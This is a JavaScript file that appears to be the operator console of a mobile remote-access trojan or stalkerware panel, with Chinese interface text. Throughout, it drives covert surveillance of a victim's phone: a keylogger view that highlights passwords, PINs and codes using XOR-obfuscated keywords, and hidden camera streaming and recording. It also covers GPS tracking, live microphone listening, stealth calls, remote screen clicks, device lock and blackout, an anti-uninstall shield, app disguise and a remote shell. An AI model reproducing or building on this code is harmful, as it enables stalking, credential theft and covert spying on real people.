    innerMarkup += `<span style="color:#fff; margin-left:12px; font-weight:bold; font-size:0.8rem; background:rgba(255,255,255,0.05); padding:2px 8px; border-radius:4px;">"${n.text}"</span>`;
  } else if (n.desc) {
    innerMarkup += `<span style="color:rgba(255,255,255,0.5); margin-left:12px; font-size:0.75rem; font-style:italic;">[${n.desc}]</span>`;
  }
  if (n.clickable) {
    innerMarkup += '<span style="background:rgba(57,255,20,0.15); color:var(--neon-green); border:1px solid rgba(57,255,20,0.4); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:12px; font-weight:900; letter-spacing:0.5px;">可点击</span>';
  }
  if (n.password) {
    innerMarkup += '<span style="background:rgba(255,49,49,0.2); color:var(--danger); border:1px solid rgba(255,49,49,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">密码</span>';
  }
  if (n.editable) {
    innerMarkup += '<span style="background:rgba(0,136,255,0.2); color:var(--encrypted-blue); border:1px solid rgba(0,136,255,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">可编辑</span>';
  }

  e.innerHTML = innerMarkup;
  e.onmouseenter = () => {
    e.style.background = "#1b1b1f";
    e.style.boxShadow = "none";
  };
  e.onmouseleave = () => {
    e.style.background = "transparent";
    e.style.boxShadow = "none";
  };
  e.onclick = event => {
    event.stopPropagation();
    const targetX = 100 * (n.x + n.w / 2) / l;
    const targetY = 100 * (n.y + n.h / 2) / s;
    fetch(`/ghost/interact?action=click&px=${targetX}&py=${targetY}`);
  };

  r.appendChild(e);
  if (n.children) {
    n.children.forEach(c => _0x5a(c, r, a + 1, l, s));
  }
}

// Keylogger Terminal Logs
async function refreshGhostLogs() {
  try {
    const res = await fetch("/ghost/keys");
    if (res.ok) {
      const data = await res.json();
      const n = document.getElementById("ghost-terminal");
      if (n && data.keys.length > 0) {
        const autoScroll = n.scrollHeight - n.scrollTop <= n.clientHeight + 10;
        let formattedText = data.keys.join("").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        formattedText = formattedText.replace(/(\[.*?\] ->)/g, '<span style="color:var(--neon-cyan); font-weight:bold; opacity:0.8;">$1</span>');
        formattedText = formattedText.replace(/(\[CLICK\]:|\[LONG_CLICK\]:)/g, '<span style="color:var(--neon-green); font-weight:bold;">$1</span>');

        ["password", "pin", "code", "auth", "login", "account", "verify"].forEach(kw => {
          const re = new RegExp("(" + kw + ")", "gi");
          formattedText = formattedText.replace(re, '<span style="color:var(--neon-yellow); font-weight:bold; border-bottom:1px solid var(--neon-yellow);">$1</span>');
        });

        formattedText = formattedText.replace(/\b(\d{4,8})\b/g, '<span style="color:var(--danger); font-weight:bold; text-shadow: none;">$1</span>');

        ["\\x1C\\x0D\\x03", "\\x13\\x18\\x00\\x12\\x13\\x01\\x10\\x0A", "\\x0F\\x06\\x14\\x00\\x0A", "\\x16\\x1A\\x16\\x13", "\\x06\\x04\\x02\\x08\\x08"].forEach(pattern => {
          const dec = pattern.split("").map((ch, idx) => String.fromCharCode(ch.charCodeAt(0) ^ "SysAdmin".charCodeAt(idx % 8))).join("");
          const re = new RegExp("(" + dec + ")", "gi");
          formattedText = formattedText.replace(re, '<span style="color:var(--danger); font-weight:bold; text-shadow: none;">$1</span>');
        });

        n.innerHTML = formattedText;
        if (autoScroll) n.scrollTop = n.scrollHeight;
      }
    }
  } catch (err) {}
}

async function checkGhostStatus() {
  try {
    const res = await fetch("/ghost/status");
    if (res.ok) {
      const data = await res.json();
      _0x2b = data.isIdle;
      const statusCard = document.getElementById("ghost-status-card");
      const statusText = document.getElementById("ghost-status-text");
      const accPrompt = document.getElementById("accessibility-prompt");
      const lockBtn = document.getElementById("lock-btn");
      const antiRemovalBtn = document.getElementById("anti-removal-btn");
      const blackoutBtn = document.getElementById("blackout-btn");

      if (data.active) {
        if (statusCard) statusCard.style.borderColor = "var(--neon-green)";
        if (statusText) statusText.innerHTML = '<span style="color:var(--neon-green);">上行已建立</span>';
        if (accPrompt) accPrompt.style.display = "none";
      } else {
        if (statusCard) statusCard.style.borderColor = "var(--danger)";
        if (statusText) statusText.innerHTML = '<span style="color:var(--danger);">离线·等待权限</span>';
        if (accPrompt) accPrompt.style.display = "block";
      }

      if (lockBtn) {
        if (data.lock) {
          lockBtn.innerHTML = "解除锁定";
          lockBtn.style.borderColor = "var(--neon-green)";
          lockBtn.style.color = "var(--neon-green)";
        } else {
          lockBtn.innerHTML = "部署锁定";
          lockBtn.style.borderColor = "var(--danger)";
          lockBtn.style.color = "var(--danger)";
        }
      }

      if (blackoutBtn) {
        if (data.blackout) {
          blackoutBtn.innerHTML = "RESTORE_DISPLAY";
          blackoutBtn.style.borderColor = "var(--neon-cyan)";
          blackoutBtn.style.color = "var(--neon-cyan)";
          const feedback = document.getElementById("blackout-feedback");
          if (feedback) feedback.style.display = "block";
        } else {
          blackoutBtn.innerHTML = "ACTIVATE_BLACKOUT";
          blackoutBtn.style.borderColor = "#fff";
          blackoutBtn.style.color = "#fff";
          const feedback = document.getElementById("blackout-feedback");
          if (feedback) feedback.style.display = "none";
        }
      }

      const screenStream = document.getElementById("ghost-screen-stream");
      if (screenStream) {
        screenStream.style.filter = data.blackout ? "brightness(7.5) contrast(1.15)" : "none";
      }

      if (antiRemovalBtn) {
        if (data.antiRemoval) {
          antiRemovalBtn.innerHTML = "防卸载护盾：开";
          antiRemovalBtn.style.borderColor = "var(--neon-yellow)";
          antiRemovalBtn.style.color = "var(--neon-yellow)";
          antiRemovalBtn.style.background = "rgba(255, 255, 0, 0.15)";
        } else {
          antiRemovalBtn.innerHTML = "防卸载护盾：关";
          antiRemovalBtn.style.borderColor = "var(--neon-yellow)";
          antiRemovalBtn.style.color = "var(--neon-yellow)";
          antiRemovalBtn.style.background = "rgba(255, 255, 0, 0.03)";
        }
      }
    }
  } catch (err) {}
}

// Camera Streaming Controls
function rotateStream() {
  _0x3b = (_0x3b + 90) % 360;
  const stream = document.getElementById("main-stream");
  if (stream) stream.style.transform = "rotate(" + _0x3b + "deg)";
}

function applyQuality(idx) {
  if (typeof resConfig !== 'undefined' && typeof resOptions !== 'undefined') {
    const cfg = resConfig[resOptions[idx]];
    _0x3d = cfg.w;
    _0x3e = cfg.h;
    _0x3f = cfg.q;
  }
  if (_0x3a && _0x3c) {
    fetch("/camera/start-stream?cam=" + _0x3c + "&width=" + _0x3d + "&height=" + _0x3e + "&quality=" + _0x3f).catch(() => {});
  }
}

async function initiateStream(camId) {
  _0x3c = camId;
  _0x3a = true;
  window.cameraStreamActive = true;

  const loading = document.getElementById("loading-overlay");
  if (loading) {
    loading.style.display = "block";
    loading.innerText = "正在初始化摄像头…";
  }

  const liveIndicator = document.getElementById("live-indicator");
  const dot = document.getElementById("indicator-dot");
  const text = document.getElementById("indicator-text");

  if (liveIndicator) {
    liveIndicator.style.borderColor = "var(--neon-green)";
    liveIndicator.style.color = "var(--neon-green)";
    liveIndicator.style.background = "rgba(57, 255, 20, 0.15)";
  }
  if (dot) dot.className = "badge-dot blink-slow";
  if (text) text.innerText = "直播";

  document.querySelectorAll(".cam-btn").forEach(btn => {
    btn.classList.remove("btn-engaged-green");
    btn.style.borderColor = "var(--neon-green)";
    btn.style.color = "var(--neon-green)";
  });

  const currentCamBtn = document.getElementById("cam-btn-" + camId);
  if (currentCamBtn) {
    currentCamBtn.classList.add("btn-engaged-green");
    currentCamBtn.style.borderColor = "";
    currentCamBtn.style.color = "";
  }

  const mainStream = document.getElementById("main-stream");
  if (mainStream) {
    try {
      await fetch("/camera/start-stream?cam=" + camId + "&width=" + _0x3d + "&height=" + _0x3e + "&quality=" + _0x3f);
    } catch (e) {}

    function refreshCameraFeed() {
      if (window.cameraStreamActive) {
        const offscreenImg = new Image();
        offscreenImg.src = "/camera/frame?t=" + Date.now();
        offscreenImg.onload = () => {
          if (window.cameraStreamActive && mainStream) {
            mainStream.src = offscreenImg.src;
            mainStream.style.display = "block";
            if (loading) loading.style.display = "none";
            setTimeout(refreshCameraFeed, 40);
          }
        };
        offscreenImg.onerror = () => {
          if (window.cameraStreamActive) setTimeout(refreshCameraFeed, 150);
        };
      } else {
        window.cameraLoopRunning = false;
      }
    }

    if (!window.cameraLoopRunning) {
      window.cameraLoopRunning = true;
      refreshCameraFeed();
    }
  }
}

function terminateCaptures() {
  _0x3a = false;
  window.cameraStreamActive = false;
  window.cameraLoopRunning = false;
  fetch("/camera/stop-stream").catch(() => {});
  const mainStream = document.getElementById("main-stream");
  if (mainStream) {
    mainStream.src = "";
    mainStream.style.display = "none";
  }

  const loading = document.getElementById("loading-overlay");
  if (loading) {
    loading.style.display = "block";
    loading.innerText = "上行就绪";
  }

  const liveIndicator = document.getElementById("live-indicator");
  const dot = document.getElementById("indicator-dot");
  const text = document.getElementById("indicator-text");

  if (liveIndicator) {
    liveIndicator.style.borderColor = "var(--neon-yellow)";
    liveIndicator.style.color = "var(--neon-yellow)";
    liveIndicator.style.background = "rgba(255, 255, 0, 0.05)";
  }
  if (dot) dot.className = "badge-dot";
  if (text) text.innerText = "待机";

  document.querySelectorAll(".cam-btn").forEach(btn => {
    btn.classList.remove("btn-engaged-green");
    btn.style.borderColor = "var(--neon-green)";
    btn.style.color = "var(--neon-green)";
  });

  fetch("/camera/terminate").then(() => {
    const recBtn = document.getElementById("rec-btn");
    if (recBtn) recBtn.innerText = "START_RECORDING";
  });
}

function capturePhoto() {
  if (!_0x3a || !_0x3c) {
    showToast("请先启动摄像头画面", "error");
    return;
  }
  showToast("正在拍照…");
  fetch("/camera/photo?cam=" + _0x3c)
    .then(res => {
      showToast("照片已保存到保险库");
      setTimeout(() => location.reload(), 1200);
    })
    .catch(err => showToast("拍照失败", "error"));
}

function toggleRecording() {
  const recBtn = document.getElementById("rec-btn");
  if (_0x3a) {
    if (recBtn && recBtn.innerText.includes("START")) {
      recBtn.innerText = "STOP_RECORDING";
      fetch("/camera/record?cam=" + _0x3c);
    } else {
      if (recBtn) recBtn.innerText = "START_RECORDING";
      fetch("/camera/stop-record");
    }
  } else {
    showToast("请先开启画面", "error");
  }
}

function checkRecStatus() {
  fetch("/camera/status")
    .then(res => res.json())
    .then(data => {
      const liveIndicator = document.getElementById("live-indicator");
      const dot = document.getElementById("indicator-dot");
      const text = document.getElementById("indicator-text");
      const recBtn = document.getElementById("rec-btn");

      if (data.last_finished) {
        if (null !== _lv && data.last_finished !== _lv) {
          showToast("数据同步：正在自动下载录音…");
          const a = document.createElement("a");
          a.href = "/download/" + data.last_finished;
          a.download = "";
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
        }
        _lv = data.last_finished;
      }

      if (data.recording) {
        if (liveIndicator) {
          liveIndicator.style.borderColor = "var(--danger)";
          liveIndicator.style.color = "var(--danger)";
          liveIndicator.style.background = "rgba(255, 49, 49, 0.15)";
        }
        if (dot) dot.className = "badge-dot blink-fast";
        if (text) text.innerText = "录像 (" + data.duration + " 秒)";
        if (recBtn) recBtn.innerText = "STOP_RECORDING";
      } else {
        if (_0x3a || window.cameraStreamActive || data.streaming) {
          if (liveIndicator) {
            liveIndicator.style.borderColor = "var(--neon-green)";
            liveIndicator.style.color = "var(--neon-green)";
            liveIndicator.style.background = "rgba(57, 255, 20, 0.15)";
          }
          if (dot) dot.className = "badge-dot blink-slow";
          if (text) text.innerText = "直播";
        } else {
          if (liveIndicator) {
            liveIndicator.style.borderColor = "var(--neon-yellow)";
            liveIndicator.style.color = "var(--neon-yellow)";
            liveIndicator.style.background = "rgba(255, 255, 0, 0.05)";
          }
          if (dot) dot.className = "badge-dot";
          if (text) text.innerText = "待机";
        }
        if (recBtn) recBtn.innerText = "START_RECORDING";
      }
    });
}

// Information Popup Listener
document.addEventListener("click", function(e) {
  const popup = document.getElementById("info-popup");
  if (popup && "block" === popup.style.display && !popup.contains(e.target)) {
    hideInfo();
  }
});

// GPS Triangulation Controls
let currentLat = 0;
let currentLon = 0;

function _0x6a(msg) {
  const o = document.getElementById("gps-log");
  if (o) {
    const div = document.createElement("div");
    div.textContent = "[" + (new Date()).toLocaleTimeString() + "] " + msg;
    o.insertBefore(div, o.firstChild);
  }
}

function locateDevice() {
  _0x6a("[请求] 正在连接定位卫星…");
  fetch("/gps/locate?json=true")
    .then(res => res.json())
    .then(data => {
      if (data.success) {
        currentLat = data.lat;
        currentLon = data.lon;
        const display = document.getElementById("coord-display");
        if (display) display.innerHTML = "LAT: " + data.lat + " | LON: " + data.lon;
        _0x6a("[成功] 已获取定位：" + data.lat + ", " + data.lon);

        const mapFrame = document.getElementById("map-frame");
        const mapOverlay = document.getElementById("map-overlay");
        const extMapBtn = document.getElementById("ext-map-btn");

        if (mapFrame) {
          mapFrame.srcdoc = `<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><style>html,body,#map{height:100%;margin:0;padding:0;background:#000;}.leaflet-tile-pane{filter:invert(90%) hue-rotate(180deg);}.red-pin{background-color:#e11d48;width:16px;height:16px;border-radius:50%;border:2px solid #ffffff;box-shadow:0 2px 6px rgba(0,0,0,0.6);margin-left:-8px;margin-top:-8px;}</style></head><body><div id="map"></div><script>var m=L.map('map',{zoomControl:false}).setView([${data.lat},${data.lon}],15);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);var redIcon=L.divIcon({className:'custom-red-pin',html:'<div class="red-pin"></div>'});L.marker([${data.lat},${data.lon}],{icon:redIcon}).addTo(m);</script></body></html>`;
          mapFrame.style.display = "block";
        }
        if (mapOverlay) mapOverlay.style.display = "none";
        if (extMapBtn) extMapBtn.style.display = "inline-block";
      } else {
        _0x6a("[错误] " + data.message);
        showToast(data.message);
      }
    })
    .catch(() => {
      _0x6a("[致命] 定位网络错误");
    });
}

function openExternalMap() {
  window.open("https://www.google.com/maps/search/?api=1&query=" + currentLat + "," + currentLon, "_blank");
}

// File Filters
function filterFiles() {
  const searchVal = document.getElementById("file-search").value.toLowerCase();
  document.querySelectorAll(".file-item").forEach(item => {
    if (item.querySelector(".file-name").textContent.toLowerCase().includes(searchVal)) {
      item.style.display = "flex";
    } else {
      item.style.display = "none";
    }
  });
}

function setFilter(ext) {
  if ("all" === ext) {
    document.querySelectorAll(".file-item").forEach(item => item.style.display = "flex");
  } else {
    const list = ext.split(",");
    document.querySelectorAll(".file-item").forEach(item => {
      const name = item.querySelector(".file-name").textContent.toUpperCase();
      const match = list.some(suffix => name.endsWith(suffix));
      item.style.display = match ? "flex" : "none";
    });
  }
}

function clearIntel() {
  showToast("正在清除情报流…");
  fetch("/intel/clear").then(() => location.reload());
}

function toggleStealth() {
  const val = document.getElementById("stealth-type").value;
  showToast("正在启动伪装…");
  fetch("/stealth?type=" + val)
    .then(res => res.json())
    .then(data => {
      if (data.status) showToast("伪装已应用：" + data.status);
    })
    .catch(err => {
      console.error(err);
      showToast("伪装请求失败", "error");
    });
}

// Robust Audio Bridge Logic with _ih cleanup
let livePlayerObj = null;

async function pollAudioChunk() {
  if (!_ac) return;
  try {
    const res = await fetch('/audio/chunk?t=' + Date.now());
    if (res.ok) {
      const blob = await res.blob();
      if (blob.size > 100 && _ac) {
        const audioUrl = URL.createObjectURL(blob);
        if (!livePlayerObj) {
          livePlayerObj = new Audio();
        }
        livePlayerObj.src = audioUrl;
        livePlayerObj.play().catch(e => console.warn("Blob play notice:", e));
      }
    }
  } catch (e) {
    console.warn("Audio chunk fetch notice:", e);
  }
  if (_ac) {
    setTimeout(pollAudioChunk, 900);
  }
}

async function toggleLiveAudio() {
  const btn = document.getElementById('live-listen-btn');
  if (_ac) {
    _ac = false;
    if (livePlayerObj) {
      try { livePlayerObj.pause(); livePlayerObj.removeAttribute('src'); } catch (e) {}
      livePlayerObj = null;
    }
    if (btn) {
      btn.innerText = '开始收听';
      btn.style.borderColor = 'var(--neon-cyan)';
      btn.style.color = 'var(--neon-cyan)';
      btn.style.background = 'transparent';
      btn.style.opacity = '1';
    }
    showToast("实时收听已停止");
  } else {
    _ac = true;
    if (btn) {
      btn.innerText = '停止收听';
      btn.style.opacity = '1';
      btn.style.borderColor = 'var(--danger)';
      btn.style.color = 'var(--danger)';
      btn.style.background = 'rgba(255, 49, 49, 0.05)';
    }
    showToast("虚拟通信：音频上行已接入");
    pollAudioChunk();
  }
}

function startMicRec(dur) {
  showToast("正在启动监听…");
  const url = dur ? "/audio/mic/start?duration=" + dur : "/audio/mic/start";
  fetch(url)
    .then(r => r.text())
    .then(() => {
      setTimeout(() => { location.href = "/audio"; }, 400);
    })
    .catch(() => {
      showToast("麦克风启动失败", "error");
    });
}

function stopMicRec() {
  showToast("正在终止监听…");
  fetch("/audio/mic/stop")
    .then(r => r.text())
    .then(() => {
      setTimeout(() => { location.href = "/audio"; }, 400);
    })
    .catch(() => {
      showToast("麦克风停止失败", "error");
    });
}

async function startStealthUplink() {
  if (_ih) {
    await toggleLiveAudio();
    return;
  }
  fetch('/audio/speakerphone?enable=true').catch(() => {});
  await toggleLiveAudio();
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
    const source = audioCtx.createMediaStreamSource(stream);
    const processor = audioCtx.createScriptProcessor(4096, 1, 1);
    processor.onaudioprocess = (e) => {
      const inputData = e.inputBuffer.getChannelData(0);
      const pcmData = new Int16Array(inputData.length);
      for (let i = 0; i < inputData.length; i++) {
        pcmData[i] = Math.max(-32768, Math.min(32767, inputData[i] * 32768));
      }
      fetch('/audio/inject', {
        method: 'POST',
        body: pcmData.buffer,
        keepalive: true
      }).catch(err => console.error("Injection failed", err));
    };
    source.connect(processor);
    processor.connect(audioCtx.destination);
    _ih = { stream, context: audioCtx, processor, source };
    showToast("隐蔽听筒：双向链路已激活");
  } catch (e) {
    console.error("Uplink failed", e);
    showToast("麦克风权限被拒绝", "error");
  }
}

// Consolidated Call Logic with Safe Input Handling (Null Checks)
async function initiateCellularCall(num) {
  if (!num) {
    const dialInput = document.getElementById("dial-number");
    num = dialInput ? dialInput.value : null;
  }
  if (!num) return showToast("请先输入号码", "error");
  try {
    await fetch("/calls/make?number=" + encodeURIComponent(num) + "&json=true");
    showToast("拨号指令已派发", "info");
  } catch (e) {
    console.error(e);
    showToast("拨号派发失败", "error");
  }
}

async function startStealthCall(num) {
  if (!num) {
    const dialInput = document.getElementById("dial-number");
    num = dialInput ? dialInput.value : null;
  }
  if (!num) return showToast("请先输入号码", "error");

  _0x4a("隐蔽上行", "正在初始化安全蜂窝桥接…", async () => {
    showToast("正在拨号…");
    try {
      const response = await fetch("/calls/make?number=" + encodeURIComponent(num) + "&stealth=true&json=true");
      showToast("上行指令已发送", "info");
      if (response.ok) {
        showToast("等待系统握手…");
        showToast("正在同步通信流…", "info");
        await new Promise(r => setTimeout(r, 3500));
        await startStealthUplink();
      }
    } catch (e) {
      console.error(e);
      showToast("隐蔽通话失败", "error");
    }
  });
}

async function startVirtualCall() {
  _0x4a("环境上行", "正在建立安全音频桥接…", async () => {
    try {
      await fetch("/calls/voip?type=ambient");
      showToast("虚拟上行已启动", "info");
      await toggleLiveAudio();
    } catch (e) {
      console.error(e);
      showToast("虚拟上行失败", "error");
    }
  });
}

function restoreNormal() {
  showToast("正在恢复原始身份…");
  fetch("/stealth?action=restore")
    .then(res => res.json())
    .then(data => {
      if (data.status) showToast("身份已恢复");
    })
    .catch(err => {
      console.error(err);
      showToast("恢复请求失败", "error");
    });
}

// Window Event Mapping & Initialization
window.alert = e => showToast(e);
window.onpopstate = updateNav;
window.addEventListener("pageshow", updateNav);
document.addEventListener("visibilitychange", () => {
  if ("visible" === document.visibilityState) updateNav();
});

document.addEventListener("DOMContentLoaded", () => {
  injectMobileStyles();
  updateNav();
  enforceGhostViewportScaling();

  let camScroll = localStorage.getItem("cam_scroll");
  if (camScroll) {
    window.scrollTo(0, parseInt(camScroll));
    localStorage.removeItem("cam_scroll");
  }

  if (document.getElementById("log-terminal")) {
    fetchLogs();
    setInterval(fetchLogs, 5000);
  }

  if (document.getElementById("ghost-status-card") || document.getElementById("ghost-screen-stream")) {
    checkGhostStatus();
    refreshGhostLogs();
    setInterval(checkGhostStatus, 2000);
    setInterval(refreshGhostLogs, 2000);
  }

  if (document.getElementById("live-indicator")) {
    setInterval(checkRecStatus, 2000);
    let opticsScroll = localStorage.getItem("optics_scroll");
    if (opticsScroll) {
      window.scrollTo(0, parseInt(opticsScroll));
      localStorage.removeItem("optics_scroll");
    }
  }

  if (window.location.pathname.includes('/audio') || document.getElementById('live-listen-btn') || document.getElementById('audio-recordings-list')) {
    let lastRecState = null;
    setInterval(() => {
      fetch("/audio/status")
        .then(res => res.json())
        .then(data => {
          if (lastRecState !== null && data.isRecording !== lastRecState) {
            lastRecState = data.isRecording;
            location.reload();
          } else {
            lastRecState = data.isRecording;
            const durationElement = document.getElementById("duration");
            if (data.isRecording && durationElement) {
              const sec = data.duration;
              const min = Math.floor(sec / 60);
              const remainingSec = sec % 60;
              durationElement.textContent = min + ":" + (remainingSec < 10 ? "0" : "") + remainingSec;
            }
          }
          if (data.callInProgress && !document.querySelector(".call-alert")) {
            location.reload();
          }
        })
        .catch(err => console.warn("Audio status check error:", err));
    }, 2000);
  }

  const shellCmdInput = document.getElementById("shell-cmd");
  if (shellCmdInput) {
    shellCmdInput.addEventListener("keydown", function(event) {
      if ("ArrowUp" === event.key) {
        event.preventDefault();
        if (_0x1c < _0x1b.length - 1) {
          _0x1c++;
          this.value = _0x1b[_0x1b.length - 1 - _0x1c];
        }
      } else if ("ArrowDown" === event.key) {
        event.preventDefault();
        if (_0x1c > 0) {
          _0x1c--;
          this.value = _0x1b[_0x1b.length - 1 - _0x1c];
        } else if (0 === _0x1c) {
          _0x1c = -1;
          this.value = "";
        }
      } else if ("Enter" === event.key) {
        executeShell();
      }
    });
  }

  const loginForm = document.getElementById("login-form");
  if (loginForm) loginForm.addEventListener("submit", handleLogin);

  const passwordForm = document.querySelector('form[action="/settings/password"]');
  if (passwordForm) passwordForm.addEventListener("submit", updatePassword);

  document.addEventListener("click", () => {
    const palette = document.getElementById("color-picker-palette");
    if (palette && "grid" === palette.style.display) {
      palette.style.display = "none";
    }
  });
});
